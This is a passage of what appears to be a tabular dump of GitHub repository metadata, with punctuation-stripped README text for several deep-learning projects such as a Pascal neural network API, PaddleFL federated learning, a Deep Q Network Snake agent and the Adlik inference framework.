TNNetMaxChannel input 2D or 3D output 1D Calculates the channel max TNNetMinChannel input 2D or 3D output 1D Calculates the channel min TNNet AddMinMaxChannel input output 1D 2D or 3D Does both min and max channel and then concatenates results TNNet AddAvgMaxChannel input output 1D 2D or 3D Does both average and max channel and then concatenates results Trainable Normalization Layers Allowing Faster Learning Convergence TNNetChannelZeroCenter input output 1D 2D or 3D Trainable zero centering TNNetMovingStdNormalization input output 1D 2D or 3D Trainable std normalization TNNetChannelStdNormalization input output 1D 2D or 3D Trainable per channel std normalization TNNet AddMovingNorm input output 1D 2D or 3D Possible replacement for batch normalization TNNet AddChannelMovingNorm input output 1D 2D or 3D Possible replacement for per batch normalization Non Trainable and per Sample Normalization Layers TNNetLayerMaxNormalization input output 1D 2D or 3D TNNetLayerStdNormalization input output 1D 2D or 3D TNNetLocalResponseNorm2D input output 2D or 3D TNNetLocalResponseNormDepth input output 2D or 3D TNNetRandomMulAdd input output 1D 2D or 3D Adds a random multiplication scale and a random bias shift TNNetChannelRandomMulAdd input output 1D 2D or 3D Adds a random multiplication scale and random bias shift per channel Concatenation Summation and Reshaping Layers TNNetConcat input output 1D 2D or 3D Allows concatenating results from previous layers TNNetDeepConcat input output 1D 2D or 3D Concatenates into the depth axis This is useful with DenseNet like architectures TNNetIdentity input output 1D 2D or 3D TNNetIdentityWithoutBackprop input output 1D 2D or 3D Allows the forward pass to proceed but prevents backpropagation TNNetReshape input output 1D 2D or 3D TNNetSplitChannels input 1D 2D or 3D output 1D 2D or 3D Splits layers channels from the input TNNetSum input output 1D 2D or 3D Sums outputs from parallel layers allowing ResNet style networks Layers with Activation Functions and no Trainable Parameter TNNetReLU input output 1D 2D or 3D TNNetSELU input output 1D 2D or 3D TNNetLeakyReLU input output 1D 2D or 3D TNNetVeryLeakyReLU input output 1D 2D or 3D TNNetSigmoid input output 1D 2D or 3D TNNetSoftMax input output 1D 2D or 3D Trainable Bias Shift and Multiplication Scaling per Cell or Channel Allowing Faster Learning and Convergence TNNetCellBias input output 1D 2D or 3D TNNetCellMul input output 1D 2D or 3D TNNetChannelBias input output 1D 2D or 3D TNNetChannelMul input output 1D 2D or 3D Opposing Operations TNNetDeLocalConnect input output 1D 2D or 3D feature size 1D or 2D TNNetDeLocalConnectReLU input output 1D 2D or 3D feature size 1D or 2D TNNetDeconvolution input output 1D 2D or 3D feature size 1D or 2D TNNetDeconvolutionReLU input output 1D 2D or 3D feature size 1D or 2D TNNetDeMaxPool input output 1D 2D or 3D max is done on a single layer Weight Initializers InitUniform Value TNeuralFloat 1 InitLeCunUniform Value TNeuralFloat 1 InitHeUniform Value TNeuralFloat 1 InitHeUniformDepthwise Value TNeuralFloat 1 InitHeGaussian Value TNeuralFloat 0 5 InitHeGaussianDepthwise Value TNeuralFloat 0 5 InitGlorotBengioUniform Value TNeuralFloat 1 Data Augmentation Methods Implemented at TVolume procedure FlipX procedure FlipY procedure CopyCropping Original TVolume StartX StartY pSizeX pSizeY integer procedure CopyResizing Original TVolume NewSizeX NewSizeY integer procedure AddGaussianNoise pMul TNeuralFloat procedure AddSaltAndPepper pNum integer pSalt integer 2 pPepper integer 2 Datasets These datasets can be easily loaded CIFAR 10 procedure CreateCifar10Volumes out ImgTrainingVolumes ImgValidationVolumes ImgTestVolumes TNNetVolumeList Source code example Simple CIFAR 10 Image Classifier https github com joaopauloschuler neural api tree master examples SimpleImageClassifier CIFAR 100 procedure CreateCifar100Volumes out ImgTrainingVolumes ImgValidationVolumes ImgTestVolumes TNNetVolumeList Source code example CAI Optimized DenseNet CIFAR 100 Image Classifier https github com joaopauloschuler neural api tree master examples Cifar100CaiDenseNet MNIST and Fashion MNIST procedure CreateMNISTVolumes out ImgTrainingVolumes ImgValidationVolumes ImgTestVolumes TNNetVolumeList TrainFileName TestFileName string Verbose boolean true IsFashion boolean false Source code examples Simple MNIST Image Classifier https github com joaopauloschuler neural api tree master examples SimpleMNist Simple Fashion MNIST Image Classifier https github com joaopauloschuler neural api tree master examples SimpleFashionMNIST Paid Support In the case that you need help with your own A I project Pascal Python PHP or Java please feel free to contact me https au linkedin com in jo o paulo schwarz schuler 785a9b2 Contributing Pull requests are welcome Having requests accepted might be hard,2019-09-23T14:03:46Z,2019-12-12T19:05:01Z,Pascal,joaopauloschuler,User,6,35,6,151,master,joaopauloschuler,1,6,6,6,10,0,0
PaddlePaddle,PaddleFL,n/a,DOC https paddlefl readthedocs io en latest Quick Start https paddlefl readthedocs io en latest instruction html READMEcn md PaddleFL is an open source federated learning framework based on PaddlePaddle Researchers can easily replicate and compare different federated learning algorithms with PaddleFL Developers can also benefit from PaddleFL in that it is easy to deploy a federated learning system in large scale distributed clusters In PaddleFL serveral federated learning strategies will be provided with application in computer vision natural language processing recommendation and so on Application of traditional machine learning training strategies such as Multi task learning Transfer Learning in Federated Learning settings will be provided Based on PaddlePaddle s large scale distributed training and elastic scheduling of training job on Kubernetes PaddleFL can be easily deployed based on full stack open sourced software Federated Learning Data is becoming more and more expensive nowadays and sharing of raw data is very hard across organizations Federated Learning aims to solve the problem of data isolation and secure sharing of data knowledge among organizations The concept of federated learning is proposed by researchers in Google 1 2 3 Overview of PaddleFL In PaddleFL horizontal and vertical federated learning strategies will be implemented according to the categorization given in 4 Application demonstrations in natural language processing computer vision and recommendation will be provided in PaddleFL Federated Learning Strategy Vertical Federated Learning Logistic Regression with PrivC Neural Network with third party PrivC 5 Horizontal Federated Learning Federated Averaging 2 Differential Privacy 6 Training Strategy Multi Task Learning 7 Transfer Learning 8 Active Learning Framework design of PaddleFL In PaddleFL components for defining a federated learning task and training a federated learning job are as follows Compile Time FL Strategy a user can define federated learning strategies with FL Strategy such as Fed Avg 1 User Defined Program PaddlePaddle s program that defines the machine learning model structure and training strategies such as multi task learning Distributed Config In federated learning a system should be deployed in distributed settings Distributed Training Config defines distributed training node information FL Job Generator Given FL Strategy User Defined Program and Distributed Training Config FL Job for federated server and worker will be generated through FL Job Generator FL Jobs will be sent to organizations and federated parameter server for run time execution Run Time FL Server federated parameter server that usually runs in cloud or third party clusters FL Worker Each organization participates in federated learning will have one or more federated workers that will communicate with the federated parameter server Install Guide and Quick Start Please reference Quick Start https paddlefl readthedocs io en latest instruction html for installation and quick start example Benchmark task Gru4Rec 9 introduces recurrent neural network model in session based recommendation PaddlePaddle s Gru4Rec implementation is in https github com PaddlePaddle models tree develop PaddleRec gru4rec An example is given in Gru4Rec in Federated Learning https paddlefl readthedocs io en latest examples gru4recexamples html On Going and Future Work Experimental benchmark with public datasets in federated learning settings Federated Learning Systems deployment methods in Kubernetes Vertical Federated Learning Strategies and more horizontal federated learning strategies will be open sourced Reference 1 Jakub Konen H Brendan McMahan Daniel Ramage Peter Richtrik Federated Optimization Distributed Machine Learning for On Device Intelligence 2016 2 H Brendan McMahan Eider Moore Daniel Ramage Blaise Agera y Arcas Federated Learning of Deep Networks using Model Averaging 2017 3 Jakub Konen H Brendan McMahan Felix X Yu Peter Richtrik Ananda Theertha Suresh Dave Bacon Federated Learning Strategies for Improving Communication Efficiency 2016 4 Qiang Yang Yang Liu Tianjian Chen Yongxin Tong Federated Machine Learning Concept and Applications 2019 5 Kai He Liu Yang Jue Hong Jinghua Jiang Jieming Wu Xu Dong et al PrivC A framework for efficient Secure Two Party Computation In Proceedings of 15th EAI International Conference on Security and Privacy in Communication Networks SecureComm 2019 6 Martn Abadi Andy Chu Ian Goodfellow H Brendan McMahan Ilya Mironov Kunal Talwar Li Zhang Deep Learning with Differential Privacy 2016 7 Virginia Smith Chao Kai Chiang Maziar Sanjabi Ameet Talwalkar Federated Multi Task Learning 2016 8 Yang Liu Tianjian Chen Qiang Yang Secure Federated Transfer Learning 2018 9 Balzs Hidasi Alexandros Karatzoglou Linas Baltrunas Domonkos Tikk Session based Recommendations with Recurrent Neural Networks 2016,2019-09-25T15:01:39Z,2019-12-12T08:33:32Z,Python,PaddlePaddle,Organization,16,34,12,84,master,guru4elephant#frankwhzhang#qjing666#jhjiangcs#giddenslee,5,0,0,8,1,2,17
MProx,deep_q_learning,n/a,Deep Q Reinforcement Learning Description Reinforcement learning can be used as a technique to train an agent to play a game in a given enviroment Q learning is a simple type of reinforcement learning whereby a Q table is created and contains the AI s estimates of the quality hence the name of each action available to the agent in each game state As the agent plays the game and collects more information it updates the Q table with new estimages Q learning is simple and effective but not scalable in all but the most simple games the state space i e the number of all possible combinations of environment states becomes too large for a simple look up table to be effective The Q table is really just a method of estimating the Q function That is a function that takes the game state and an action as its inputs and returns an estimate of the quality of that action as an output Another method of doing this is to use convolutional neural networks to estimate all possible action values for a given game state This combination of Q learning with deep learning is call a Deep Q Network DQN The advantage of DQNs is a we do not need to store an impossibly large Q table to play a moderately complex game and b neural networks are good at finding patterns so it doesn t need to have previously encountered an exact version of a game frame in order to be able to generalize the model to make a decent guess at the answer This repository contains my implementation of a Deep Q Network to play the game Snake It is worth noting a few things The agent is only supplied with the game screen of each frame as a 3 dimensional RGB pixel array a positive or negative reward for each game screen and a set of possible actions to take It does NOT know what the pixels represent I e it doesn t start out knowing what a snake is or that the food is good and crashing is bad It does NOT know what each action represents It doesn t know what up down left or right do in the context of the game All it knows is that the pixel array changes with each game screen that the actions may or may not affect how the pixels change and that sometimes the game score changes but it doesn t know what actions or sequences of actions cause this From this input the agent plays millions of game screens and eventually learns to win the game Below is an animation of the AI in this repo after 2 million game frames of training approximately 20 hours on my GPU enabled laptop snaketrained gif Dependencies Gym Gymsnake https github com grantsrb Gym Snake Matplotlib Tensorflow tested with tensorflow gpu 2 0 0b1 Numpy Usage Clone this repository From the command like execute the following to see all flags and options python DQNsnake py help To train the model with default parameters default of 1 000 000 frames use the m python DQNsnake py m train To train the model on a different number of frames use the n flag python DQNsnake py m train n 2000000 To test the model on untrained weights and biases use the m flag expect poor performance python DQNsnake py m test To supply a trained model file for evaluation use the f flag python DQNsnake py m test f snake h5 To edit hyperparameters change the class variables in thier definition near the top of the DQNsnake py file Once the model is running open a terminal or command prompt and start tensorboard with the following command tensorboard logdir logs Then open a browser window and navigate to localhost 6006 to see stats and training progress TO DO Possibly move all hyperparameters to a separate file save in JSON format Improve the model to use Double DQN Dueling DQN etc,2019-09-21T19:59:07Z,2019-11-17T05:03:15Z,Python,MProx,User,3,33,4,7,master,MProx,1,0,0,0,1,0,0
PracticalDL,Practical-Deep-Learning-Book,artificial-intelligence#cloud#deep-learning#deep-learning-tutorial#edge#machine-learning#mobile#object-detection#oreilly#oreilly-books,Practical Deep Learning for Cloud Mobile and Edge This is the official code repository for the O Reilly Publication Practical Deep Learning for Cloud Mobile and Edge https www oreilly com library view practical deep learning 9781492034858 by Anirudh Koul https twitter com AnirudhKoul Siddha Ganju https twitter com siddhaganju and Meher Kasam https twitter com MeherKasam Online on Safari https www oreilly com library view practical deep learning 9781492034858 Buy on Amazon https www amazon com Practical Learning Cloud Mobile Hands dp 149203486X Online on Google Books https books google com books id B3ovwEACAAJ Book Website http practicaldeeplearning ai Presentation on Slideshare https www slideshare net anirudhkoul deep learning on mobile 2019 practitioners guide Table of contents Book Description book description Chapter List chapter list How to Use this repository how to use this repository Environment environment Bug Reporting bug reporting About the Authors about the authors Citation citation Book Description Whether youre a software engineer aspiring to enter the world of deep learning a veteran data scientist or a hobbyist with a simple dream of making the next viral AI app you might have wondered where do I begin This step by step guide teaches you how to build practical deep learning applications for the cloud mobile browser and edge devices using a hands on approach Relying on years of industry experience transforming deep learning research into award winning applications Anirudh Koul Siddha Ganju and Meher Kasam guide you through the process of converting an idea into something that people in the real world can use Train tune and deploy computer vision models with Keras TensorFlow Core ML and TensorFlow Lite Develop AI for a range of devices including Raspberry Pi Jetson Nano and Google Coral Explore fun projects from Silicon Valleys Not Hotdog app to 40 industry case studies Simulate an autonomous car in a video game environment and build a miniature version with reinforcement learning Use transfer learning to train models in minutes Discover 50 practical tips for maximizing model accuracy and speed debugging and scaling to millions of users Chapter List Chapter 1 Exploring the Landscape of Artificial Intelligence https github com practicaldl Practical Deep Learning Book tree master code chapter 1 Read online https learning oreilly com library view practical deep learning 9781492034858 ch01 html We take a tour of this evolving landscape from 1950s till today and analyze the ingredients that make for a perfect deep learning recipe get familiar with common AI terminology and datasets and take a peek into the world of responsible AI Chapter 2 Whats in the Picture Image Classification with Keras https github com practicaldl Practical Deep Learning Book tree master code chapter 2 Read online https learning oreilly com library view practical deep learning 9781492034858 ch02 html We delve into the world of image classification in a mere five lines of Keras code We then learn what neural networks are paying attention to while making predictions by overlaying heatmaps on videos Bonus we hear the motivating personal journey of Franois Chollet the creator of Keras illustrating the impact a single individual can have Chapter 3 Cats versus Dogs Transfer Learning in 30 Lines with Keras https github com practicaldl Practical Deep Learning Book tree master code chapter 3 Read online https learning oreilly com library view practical deep learning 9781492034858 ch03 html We use transfer learning to reuse a previously trained network on a new custom classification task to get near state of the art accuracy in a matter of minutes We then slice and dice the results to understand how well is it classifying Along the way we build a common machine learning pipeline which is repurposed throughout the book Bonus we hear from Jeremy Howard co founder of fast ai on how hundreds of thousands of students use transfer learning to jumpstart their AI journey Chapter 4 Building a Reverse Image Search Engine Understanding Embeddings https github com practicaldl Practical Deep Learning Book tree master code chapter 4 Read online https learning oreilly com library view practical deep learning 9781492034858 ch04 html Like Google Reverse Image Search we explore how one can use embeddingsa contextual representation of an image to find similar images in under ten lines And then the fun starts when we explore different strategies and algorithms to speed this up at scale from thousands to several million images and making them searchable in microseconds Chapter 5 From Novice to Master Predictor Maximizing Convolutional Neural Network Accuracy https github com practicaldl Practical Deep Learning Book tree master code chapter 5 Read online https learning oreilly com library view practical deep learning 9781492034858 ch05 html We explore strategies to maximize the accuracy that our classifier can achieve with the help of a range of tools including TensorBoard What If Tool tf explain TensorFlow Datasets AutoKeras AutoAugment Along the way we conduct experiments to develop an intuition of what parameters might or might not work for your AI task Chapter 6 Maximizing Speed and Performance of TensorFlow A Handy Checklist https github com practicaldl Practical Deep Learning Book tree master code chapter 6 Read online https learning oreilly com library view practical deep learning 9781492034858 ch06 html We take the speed of training and inference into hyperdrive by going through a checklist of 30 tricks to reduce as many inefficiencies as possible and maximize the value of your current hardware Chapter 7 Practical Tools Tips and Tricks https github com practicaldl Practical Deep Learning Book tree master code chapter 7 Read online https learning oreilly com library view practical deep learning 9781492034858 ch07 html We diversify our practical skills in a variety of topics and tools ranging from installation data collection experiment management visualizations keeping track of the state of the art in research all the way to exploring further avenues for building the theoretical foundations of deep learning Chapter 8 Cloud APIs for Computer Vision Up and Running in 15 Minutes https github com practicaldl Practical Deep Learning Book tree master code chapter 8 Read online https learning oreilly com library view practical deep learning 9781492034858 ch08 html Work smart not hard We utilize the power of cloud AI platforms from Google Microsoft Amazon IBM and Clarifai in under 15 minutes For tasks not solved with existing APIs we then use custom classification services to train classifiers without coding And then we pit them against each other in an open benchmark you might be surprised who won Chapter 9 Scalable Inference Serving on Cloud with TensorFlow Serving and KubeFlow https github com practicaldl Practical Deep Learning Book tree master code chapter 9 Read online https learning oreilly com library view practical deep learning 9781492034858 ch09 html We take our custom trained model to the cloud on premises to scalably serve from tens to millions of requests We explore Flask Google Cloud ML Engine TensorFlow Serving and KubeFlow showcasing the effort scenario and cost benefit analysis Chapter 10 AI in the Browser with TensorFlow js and ml5 js https github com practicaldl Practical Deep Learning Book tree master code chapter 10 Read online https learning oreilly com library view practical deep learning 9781492034858 ch10 html Every single individual who uses a computer or a smartphone uniformly has access to one software programtheir browser Reach all those users with browser based deep learning libraries including TensorFlow js and ml5 js Guest author Zaid Alyafeai walks us through techniques and tasks such as body pose estimation generative adversarial networks GANs image to image translation with Pix2Pix and more running not on a server but in the browser itself Bonus Hear from TensorFlow js and ml5 js teams on how the projects incubated Chapter 11 Real Time Object Classification on iOS with Core ML https github com practicaldl Practical Deep Learning Book tree master code chapter 11 Read online https learning oreilly com library view practical deep learning 9781492034858 ch11 html We explore the landscape of deep learning on mobile with a sharp focus on the Apple ecosystem with Core ML We benchmark models on different iPhones investigate strategies to reduce app size and energy impact dynamic model deployment training on device and how professional apps are built Chapter 12 Not Hotdog on iOS with Core ML and Create ML https github com practicaldl Practical Deep Learning Book tree master code chapter 12 Read online https learning oreilly com library view practical deep learning 9781492034858 ch12 html Silicon Valleys Not Hotdog app from HBO is considered the Hello World of mobile AI so we pay tribute by building a real time version in not one not two but three different ways Chapter 13 Shazam for Food Developing Android Apps with TensorFlow Lite and ML Kit https github com practicaldl Practical Deep Learning Book tree master code chapter 13 Read online https learning oreilly com library view practical deep learning 9781492034858 ch13 html We bring AI to Android with the help of TensorFlow Lite We then look at cross platform development using ML Kit which is built on top of TensorFlow Lite and Fritz to explore the end to end development life cycle for building a self improving AI app Along the way we look at model versioning A B testing measuring success dynamic updates model optimization and other topics Bonus We get to hear about Pete Wardens technical lead for Mobile and Embedded TensorFlow rich experience in bringing AI to edge devices Chapter 14 Building the Purrfect Cat Locator App with TensorFlow Object Detection API https github com practicaldl Practical Deep Learning Book tree master code chapter 14 Read online https learning oreilly com library view practical deep learning 9781492034858 ch14 html We explore four different methods for locating the position of objects within images We take a look at the evolution of object detection over the years and analyze the tradeoffs between speed and accuracy This builds the base for case studies such as crowd counting face detection and autonomous cars Chapter 15 Becoming a Maker Exploring Embedded AI at the Edge https github com practicaldl Practical Deep Learning Book tree master code chapter 15 Read online https learning oreilly com library view practical deep learning 9781492034858 ch15 html Guest author Sam Sterckval brings deep learning to low power devices as he showcases a range of AI capable edge devices with varying processing power and cost including Raspberry Pi NVIDIA Jetson Nano Google Coral Intel Movidius PYNQ Z2 FPGA opening the doors for robotics and maker projects Bonus Hear from the NVIDIA Jetson Nano team on how people are building creative robots quickly from their open sourced recipe book Chapter 16 Simulating a Self Driving Car using End to End Deep Learning with Keras https github com practicaldl Practical Deep Learning Book tree master code chapter 16 Read online https learning oreilly com library view practical deep learning 9781492034858 ch16 html Using the photorealistic simulation environment of Microsoft AirSim guest authors Aditya Sharma and Mitchell Spryn guide us in training a virtual car by driving it first within the environment and then teaching an AI model to replicate its behavior Along the way this chapter covers a number of concepts that are applicable in the autonomous car industry Chapter 17 Building an Autonomous Car in Under an Hour Reinforcement Learning with AWS DeepRacer https github com practicaldl Practical Deep Learning Book tree master code chapter 17 Read online https learning oreilly com library view practical deep learning 9781492034858 ch17 html Moving from the virtual to the physical world guest author Sunil Mallya showcases how AWS DeepRacer a miniature car can be assembled trained and raced in under an hour And with the help of reinforcement learning the car learns to drive on its own penalizing mistakes and maximizing success We learn how to apply this knowledge to races from the Olympics of AI Driving to RoboRace using full sized autonomous cars Bonus Hear from Anima Anandkumar NVIDIA and Chris Anderson founder of DIY Robocars on where the self driving automotive industry is headed How to Use this Repository First off welcome We are happy that you have decided to use the book and the code to learn more about Deep Learning We wish you the best for your journey forward Here are a few things to keep in mind while using the repository Code for each chapter is present in the code https github com practicaldl Practical Deep Learning Book blob master code folder There is a respective README in each chapter that provides chapter specific instructions on how to proceed with the code and what data to download Please follow these https colab research google com github googlecolab colabtools blob master notebooks colab github demo ipynb scrollTo WzIRIt9d2huC instructions to load the GitHub repo on Google Colab Keep in mind that you will need access to your own Google Drive as we will be using data from a local system Environment We will use a virtualenv by the name of practicaldl throughout the book The requirements txt for this virtualenv are in the root directory Help and instructions to install virtualenv are in the Installation https github com practicaldl Practical Deep Learning Book blob master FAQ md installation section in the FAQ https github com practicaldl Practical Deep Learning Book blob master FAQ md document Bug Reporting Please file a issue according to CONTRIBUTING https github com practicaldl Practical Deep Learning Book blob master CONTRIBUTING md and we will investigate About the authors AnirudhKoul https twitter com AnirudhKoul is a noted AI expert UN TEDx speaker and a former scientist at Microsoft AI Research where he founded Seeing AI often considered the most used technology among the blind community after the iPhone Anirudh serves as the Head of AI Research at Aira recognized by Time Magazine as one of the best inventions of 2018 With features shipped to a billion users he brings over a decade of production oriented Applied Research experience on PetaByte scale datasets He has been developing technologies using AI techniques for Augmented Reality Robotics Speech Productivity as well as Accessibility His work in the AI for Good field which IEEE has called life changing has received awards from CES FCC MIT Cannes Lions American Council of the Blind showcased at events by UN World Economic Forum White House House of Lords Netflix National Geographic and lauded by world leaders including Justin Trudeau and Theresa May SiddhaGanju https twitter com SiddhaGanju an AI researcher who Forbes featured in their 30 under 30 list is a Self ,2019-10-13T01:54:40Z,2019-12-14T16:09:19Z,Jupyter Notebook,PracticalDL,User,4,32,5,72,master,sidgan#meherkasam#PracticalDL,3,0,0,8,5,0,48
Adlik,Adlik,n/a,Adlik Build Status https dev azure com Adlik GitHub apis build status Adlik Adlik branchName master https dev azure com Adlik GitHub build latest definitionId 1 branchName master Bors enabled https bors tech images badgesmall svg https app bors tech repositories 20625 Adlik is an end to end optimizing framework for deep learning models The goal of Adlik is to accelerate deep learning inference process both on cloud and embedded environment Adlik consists of two sub projects Model compiler and Serving platform Model compiler supports several optimizing technologies like pruning quantization and structural compression which can be easily used for models developed with TensorFlow Keras PyTorch etc Serving platform provides deep learning models with optimized runtime based on the deployment environment Put simply based on a deep learning model the users of Adlik can optimize it with model compiler and then deploy it to a certain platform with Adlik serving platform Adlik schematic diagram resources adlik png With Adlik framework different deep learning models can be deployed to different platforms with high performance in a much flexible and easy way Adlik Model Compiler Model Compiler schematic diagram resources model compiler png 1 Support optimization for models from different kinds of deep learning architecture eg TensorFlow Caffe PyTorch 2 Support compiling models as different formats OpenVINO IR ONNX TensorRT for different runtime eg CPU GPU FPGA 3 Simplified interfaces for the workflow Adlik Serving Engine Serving Engine schematic diagram resources serving engine png 1 Model uploading upgrading model inference monitoring 2 Unified inference interfaces for different models 3 Management and scheduling for a solution with multiple models in various runtime 4 Automatic selection of inference runtime 5 Ability to add customized runtime Build This guide is for building Adlik on Ubuntu https ubuntu com systems First install Git https git scm com download and Bazel https docs bazel build install html Then clone Adlik and change the working directory into the source directory sh git clone https github com ZTE Adlik git cd Adlik Build clients 1 Install the following packages python3 setuptools python3 wheel 2 Build clients sh bazel build adlikserving clients python buildpippackage c opt incompatiblenosupporttoolsinactioninputs false 3 Build pip package sh mkdir tmp pip packages bazel bin adlikserving clients python buildpippackage tmp pip packages Build serving First install the following packages automake libtool make Build serving with OpenVINO runtime 1 Install intel openvino ie rt core package from OpenVINO https software intel com en us openvino toolkit choose download 2 Assume the installation path of OpenVINO is opt intel openvinoVERSION run the following command sh export INTELCVSDKDIR opt intel openvinoVERSION export InferenceEngineDIR INTELCVSDKDIR deploymenttools inferenceengine share bazel build adlikserving config openvino c opt incompatiblenosupporttoolsinactioninputs false incompatibledisablenocopts false Build serving with TensorFlow CPU runtime Run the following command sh bazel build adlikserving config tensorflow cpu c opt incompatiblenosupporttoolsinactioninputs false incompatibledisablenocopts false Build serving with TensorFlow GPU runtime Assume builing with CUDA version 10 0 1 Install the following packages from here https docs nvidia com cuda cuda installation guide linux index html ubuntu installation and here https docs nvidia com deeplearning sdk cudnn install index html ubuntu network installation cuda cublas dev 10 0 cuda cufft dev 10 0 cuda cupti 10 0 cuda curand dev 10 0 cuda cusolver dev 10 0 cuda cusparse dev 10 0 libcudnn7 cuda10 0 libcudnn7 dev cuda10 0 2 Run the following command sh env TFCUDAVERSION 10 0 bazel build adlikserving config tensorflow gpu c opt incompatiblenosupporttoolsinactioninputs false incompatibledisablenocopts false incompatibleusespecifictoolfiles false Build serving with TensorRT runtime Assume builing with CUDA version 10 0 1 Install the following packages from here https docs nvidia com cuda cuda installation guide linux index html ubuntu installation and here https docs nvidia com deeplearning sdk cudnn install index html ubuntu network installation cuda cublas 10 0 cuda cufft 10 0 cuda cupti 10 0 cuda curand 10 0 cuda cusolver 10 0 cuda cusparse 10 0 cuda nvml dev 10 0 libcudnn7 cuda10 0 libcudnn7 dev cuda10 0 libnvinfer6 cuda10 0 libnvinfer dev cuda10 0 libnvonnxparsers6 cuda10 0 libnvonnxparsers dev cuda10 0 2 Run the following command sh env TFCUDAVERSION 10 0 bazel build adlikserving config tensorrt c opt actionenv LIBRARYPATH usr local cuda 10 0 lib64 stubs incompatiblenosupporttoolsinactioninputs false incompatibledisablenocopts false Build in Docker The ci docker build sh file can be used to build a Docker images that contains all the requirements for building Adlik You can build Adlik with the Docker image,2019-09-23T21:06:09Z,2019-12-13T11:48:46Z,C++,Adlik,Organization,11,31,9,55,master,EFanZh#bors[bot]#shiyingjin#amadeus-zte#hanbt#austinzh,6,0,0,4,6,2,47
researchmm,DBTNet,n/a,DBTNet MXNet version of the code for our NeurIPS 19 paper Learning Deep Bilinear Transformation for Fine grained Image Representation The model and a well orgnized version of the code will be available in a week Note that we reimplement the BatchDot function for faster training which will be released later,2019-10-26T13:39:22Z,2019-12-14T16:52:50Z,Python,researchmm,Organization,6,31,1,2,master,Heliang-Zheng,1,0,0,5,0,0,0
BayesWatch,deep-kernel-transfer,bayesian-methods#deep-learning#few-shot-learning#gaussian-processes#kernels,This repository contains the official pytorch implementation of the paper Deep Kernel Transfer in Gaussian Processes for Few shot Learning 2019 Patacchiola Turner Crowley and Storkey download paper https arxiv org abs 1910 05199 Overview We introduce a Bayesian method based on Gaussian Processes GPs https en wikipedia org wiki Gaussianprocess that can learn efficiently from a limited amount of data and generalize across new tasks and domains We frame few shot learning as a model selection problem by learning a deep kernel across tasks and then using this kernel as a covariance function in a GP prior for Bayesian inference This probabilistic treatment allows for cross domain flexibility and uncertainty quantification We provide substantial experimental evidence showing that the proposed method is better than several state of the art algorithms in few shot regression and cross domain classification Cite this paper if you use the method or code in this repository as part of a published research project articlepatacchiola2019deep title Deep Kernel Transfer in Gaussian Processes for Few shot Learning author Patacchiola Massimiliano and Turner Jack and Crowley Elliot J and Storkey Amos journal arXiv preprint arXiv 1910 05199 year 2019 Requirements 1 Python 3 x 2 Numpy 1 17 3 pyTorch https pytorch org 1 2 0 4 GPyTorch https gpytorch ai 0 3 5 5 optional TensorboardX https pypi org project tensorboardX GPNet code of our method Regression The implementation of our method is based on the gpyTorch https gpytorch ai library The code for the regression case is available in gpnetregression py methods gpnetregression py Classification The code for the classification case is accessible in gpnet py methods gpnet py with most of the important pieces contained in the trainloop method training and in the correct method testing Note there is the possibility of using the scikit https scikit learn org stable modules gaussianprocess html Laplace approximation at test time classification only setting laplace True in correct However this has not been investigated enough and it is not the method used in the paper Experiments These are the instructions to train and test the methods reported in the paper in the various conditions Download and prepare a dataset This is an example of how to download and prepare a dataset for training testing Here we assume the current directory is the project root folder cd filelists DATASETNAME sh downloadDATASETNAME sh Replace DATASETNAME with one of the following omniglot CUB miniImagenet emnist QMUL Notice that mini ImageNet is a large dataset that requires substantial storage therefore you can save the dataset in another location and then change the entry in configs py in accordance Methods There are a few available methods that you can use gpnet maml mamlapprox protonet relationnet matchingnet baseline baseline You must use those exact strings at training and test time when you call the script see below Note that our method is gpnet and that baseline corresponds to feature transfer in our paper By default GPNet has a linear kernel to change this please edit the entry in configs py Backbone The script allows training and testing on different backbone networks By default the script will use the same backbone used in our experiments Conv4 Check the file backbone py for the available architectures and use the parameter model BACKBONESTRING where BACKBONESTRING is one of the following Conv4 Conv6 ResNet10 18 34 50 101 Regression QMUL Head Pose Trajectory Regression The methods that can be used for regression are gpnet and transfer feature transfer In order to train these methods use python trainregression py method gpnet seed 1 The number of training epochs can be set with stopepoch If you wish to change the kernel please edit the entry in configs py which defaults to Linear The above command will save a checkpoint to save checkpoints QMUL Conv3gpnet which you can test on the test set with python testregression py method gpnet seed 1 You can additionally specify the size of the support set with nsupport which defaults to 5 and the number of test epochs with ntestepochs which defaults to 10 Classification Train classification The various methods can be trained using the following syntax python train py dataset miniImagenet method gpnet trainnway 5 testnway 5 nshot 1 seed 1 trainaug This will train GPNet 5 way 1 shot on the mini ImageNet dataset with seed 1 The dataset string can be one of the following CUB miniImagenet At training time the best model is evaluated on the validation set and stored as bestmodel tar in the folder save checkpoints DATASETNAME The parameter trainaug enables data augmentation The parameter seed set the seed for pytorch numpy and random Set seed 0 or remove the parameter for a random seed Additional parameters are reported in the file ioutils py Test classification For testing gpnet maml and mamlapprox it is enough to repeat the train command replacing the call to train py with the call to test py as follows python test py dataset miniImagenet method gpnet trainnway 5 testnway 5 nshot 1 seed 1 trainaug Other methods require to store the features for efficiency before testing this can be done running the script savefeatures py before calling test py For instance if you trained a protonet you should call python savefeatures py dataset miniImagenet method protonet trainnway 5 testnway 5 nshot 1 seed 1 trainaug python test py dataset miniImagenet method protonet trainnway 5 testnway 5 nshot 1 seed 1 repeat 5 trainaug We noticed that the original code https github com wyharveychen CloserLookFewShot has a large variance on test tasks To reduce this variance we add the parameter repeat N It iterates N times with different seeds and take an average over the N tests we used N 5 3000 tasks in our experiments Cross domain classification For the cross domain classification experiments the procedure is the same described previously The only difference is that the available datasets are crosschar and cross The former being omniglot EMNIST and the latter miniImagenet CUB Here an example of training procedure python train py dataset crosschar method gpnet trainnway 5 testnway 5 nshot 1 seed 1 Note that the parameter trainaug data augmentation is not used for crosschar but only for cross Acknowledgements This repository is a fork of https github com wyharveychen CloserLookFewShot https github com wyharveychen CloserLookFewShot,2019-10-10T13:13:56Z,2019-11-28T17:19:29Z,Python,BayesWatch,Organization,6,30,3,27,master,mpatacchiola#jack-willturner#elliotjcrowley,3,0,0,0,0,0,0
pranjalchaubey,Deep-Learning-Notes,n/a,Deep Learning Notes My handwritten notes from Udacity s Deep Learning Course,2019-10-08T13:13:18Z,2019-12-13T15:17:21Z,n/a,pranjalchaubey,User,1,30,1,12,master,pranjalchaubey,1,0,0,0,0,0,0
